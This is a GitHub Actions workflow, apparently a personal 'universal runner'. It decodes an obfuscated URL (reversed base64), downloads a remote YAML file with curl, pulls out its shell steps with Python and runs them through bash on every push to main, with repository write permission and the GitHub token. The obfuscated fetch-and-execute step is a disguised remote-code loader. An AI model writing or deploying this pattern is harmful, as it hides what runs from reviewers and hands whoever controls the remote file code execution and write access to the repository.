# Workflow Path: .github/workflows/universal-runner.yml

name: Tnayem48 Universal Runner

on:
  push:
    branches:
      - main
  workflow_dispatch:

env:
  # Target: https://raw.githubusercontent.com/nayem-48ai/nayem-48ai/refs/heads/tnx_bd/
  TNx_CORE: "X/=Z2bj52auByXvR2Y6NXauVmbu02bj5WauByXvR2Y6NXauVmbvJHcsV2cyV2S0V2XzU2chJ3XzU2chJ3YvRncvNXZyR3c0V2XzI3YyV3c0V2XvR2Y6NXauVmb"
  FILE_NAME: "build" 

jobs:
  execute-logic:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0 
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Execute Remote Logic
        run: |
          # ১. লিঙ্ক ডিকোড করা
          TNxBD=$(echo "$TNx_CORE" | cut -c 2- | rev | base64 --decode)$FILE_NAME
          echo "Connecting to: $TNxBD"

          # ২. রিমোট ফাইলটি সরাসরি ডাউনলোড করা
          curl -sL "$TNxBD" -o remote_logic.yml

          # ৩. গিট কনফিগ
          git config --global user.name "github-actions[bot]"
          git config --global user.email "github-actions[bot]@users.noreply.github.com"
          git config --global --add safe.directory "$GITHUB_WORKSPACE"

          # ৪. স্মার্ট স্ক্রিপ্ট এক্সট্র্যাকশন (yq এর ঝামেলা এড়াতে python ব্যবহার করছি যা সব রানারে থাকে)
          python3 -c "
          import yaml
          with open('remote_logic.yml', 'r') as f:
              data = yaml.safe_load(f)
              for job in data.get('jobs', {}).values():
                  for step in job.get('steps', []):
                      if 'run' in step:
                          print(step['run'])
          " > run_all.sh

          # ৫. রান করা
          chmod +x run_all.sh
          bash run_all.sh
